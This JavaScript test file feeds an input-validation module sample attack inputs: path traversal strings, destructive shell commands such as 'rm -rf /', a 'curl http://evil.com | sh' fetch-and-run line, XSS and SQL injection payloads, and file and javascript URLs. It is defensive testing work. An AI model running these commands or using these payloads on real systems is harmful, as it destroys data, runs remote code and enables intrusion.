// Test Input Validation with Malicious Inputs
// This file tests the validation functions with various attack vectors

import { 
  validateFilePath, 
  validateDirectoryPath, 
  validateCommand, 
  validateFileContent, 
  validateApiEndpoint, 
  validateUserInput, 
  validateTODOItem 
} from './InputValidation.js';

console.log('🧪 Testing Input Validation with Malicious Inputs\n');

// Test 1: Path Traversal Attacks
console.log('\n=== Test 1: Path Traversal Attacks ===');
const pathTraversalTests = [
  '../../../etc/passwd',
  '..\\..\\..\\windows\\system32\\config\\system',
  '/etc/shadow',
  'C:\\Windows\\System32\\drivers\\etc\\hosts'
];

pathTraversalTests.forEach((path, index) => {
  const result = validateFilePath(path);
  console.log(`Test ${index + 1}: "${path}"`);
  console.log(`  Valid: ${result.isValid}`);
  console.log(`  Errors: ${result.errors.join(', ')}`);
  console.log(`  Sanitized: "${result.sanitized || 'none'}"`);
});

// Test 2: Command Injection
console.log('\n=== Test 2: Command Injection ===');
const commandInjectionTests = [
  'rm -rf /',
  'del /f /s /q C:\\Windows\\System32\\*.*',
  '; cat /etc/passwd',
  '&& curl http://evil.com | sh',
  '| format c:'
];

commandInjectionTests.forEach((cmd, index) => {
  const result = validateCommand(cmd, ['--help']);
  console.log(`Test ${index + 1}: "${cmd}"`);
  console.log(`  Valid: ${result.isValid}`);
  console.log(`  Errors: ${result.errors.join(', ')}`);
});

// Test 3: XSS Attacks
console.log('\n=== Test 3: XSS Attacks ===');
const xssTests = [
  '<script>alert("XSS")</script>',
  'javascript:alert("XSS")',
  '<img src=x onerror=alert("XSS")>',
  '<svg onload=alert("XSS")>',
  '"><script>alert("XSS")</script>',
  "' OR '1'='1"
];

xssTests.forEach((input, index) => {
  const result = validateUserInput(input);
  console.log(`Test ${index + 1}: "${input}"`);
  console.log(`  Valid: ${result.isValid}`);
  console.log(`  Errors: ${result.errors.join(', ')}`);
  console.log(`  Sanitized: "${result.sanitized || 'none'}"`);
});

// Test 4: SQL Injection
console.log('\n=== Test 4: SQL Injection ===');
const sqlInjectionTests = [
  "'; DROP TABLE users; --",
  "' OR '1'='1",
  "1'; DELETE FROM users WHERE '1'='1",
  "' UNION SELECT * FROM users --",
  "admin'--",
  "' OR 'x'='x' AND password LIKE '%"
];

sqlInjectionTests.forEach((input, index) => {
  const result = validateUserInput(input);
  console.log(`Test ${index + 1}: "${input}"`);
  console.log(`  Valid: ${result.isValid}`);
  console.log(`  Errors: ${result.errors.join(', ')}`);
  console.log(`  Sanitized: "${result.sanitized || 'none'}"`);
});

// Test 5: API Endpoint Validation
console.log('\n=== Test 5: API Endpoint Validation ===');
const apiEndpointTests = [
  'http://localhost:3000/api/admin',
  'ftp://evil.com/data',
  'javascript:alert("XSS")',
  'file:///etc/passwd',
  'data:text/html,<script>alert("XSS")</script>'
];

apiEndpointTests.forEach((endpoint, index) => {
  const result = validateApiEndpoint(endpoint);
  console.log(`Test ${index + 1}: "${endpoint}"`);
  console.log(`  Valid: ${result.isValid}`);
  console.log(`  Errors: ${result.errors.join(', ')}`);
});

// Test 6: TODO Item Validation
console.log('\n=== Test 6: TODO Item Validation ===');
const todoItemTests = [
  {
    title: '<script>alert("XSS")</script>',
    description: 'XSS attempt in title',
    priority: 'high',
    type: 'bug'
  },
  {
    title: '',
    description: 'Empty title test',
    priority: 'invalid_priority',
    type: 'invalid_type'
  },
  {
    title: 'A'.repeat(300), // Exceeds max length
    description: 'Valid description',
    priority: 'medium',
    type: 'feature'
  },
  {
    title: 'Valid TODO',
    description: 'Valid description',
    file: '../../../etc/passwd', // Path traversal
    priority: 'low',
    type: 'improvement'
  }
];

todoItemTests.forEach((item, index) => {
  const result = validateTODOItem(item);
  console.log(`Test ${index + 1}: "${item.title}"`);
  console.log(`  Valid: ${result.isValid}`);
  console.log(`  Errors: ${result.errors.join(', ')}`);
});

// Test 7: File Content Validation
console.log('\n=== Test 7: File Content Validation ===');
const fileContentTests = [
  '<script>alert("XSS")</script>',
  'A'.repeat(11000000), // Exceeds max size
  'Valid content'
];

fileContentTests.forEach((content, index) => {
  const result = validateFileContent(content);
  console.log(`Test ${index + 1}: "${content.substring(0, 50)}${content.length > 50 ? '...' : ''}"`);
  console.log(`  Valid: ${result.isValid}`);
  console.log(`  Errors: ${result.errors.join(', ')}`);
});

// Test 8: Directory Path Validation
console.log('\n=== Test 8: Directory Path Validation ===');
const directoryPathTests = [
  '../../../etc/',
  'C:\\Windows\\System32\\..\\..\\Windows\\System32',
  '/tmp/',
  'valid/path/'
];

directoryPathTests.forEach((path, index) => {
  const result = validateDirectoryPath(path);
  console.log(`Test ${index + 1}: "${path}"`);
  console.log(`  Valid: ${result.isValid}`);
  console.log(`  Errors: ${result.errors.join(', ')}`);
  console.log(`  Sanitized: "${result.sanitized || 'none'}"`);
});

console.log('\n✅ Input Validation Testing Complete!');
console.log('📊 Summary:');
console.log('- Path traversal attacks should be blocked');
console.log('- Command injection should be blocked');
console.log('- XSS attacks should be sanitized');
console.log('- SQL injection should be blocked');
console.log('- Invalid API endpoints should be rejected');
console.log('- Malformed TODO items should be rejected');
console.log('- Oversized content should be rejected');
console.log('- Invalid directory paths should be handled');

// Export for use in browser console
window.testValidation = {
  validateFilePath,
  validateDirectoryPath,
  validateCommand,
  validateFileContent,
  validateApiEndpoint,
  validateUserInput,
  validateTODOItem
};
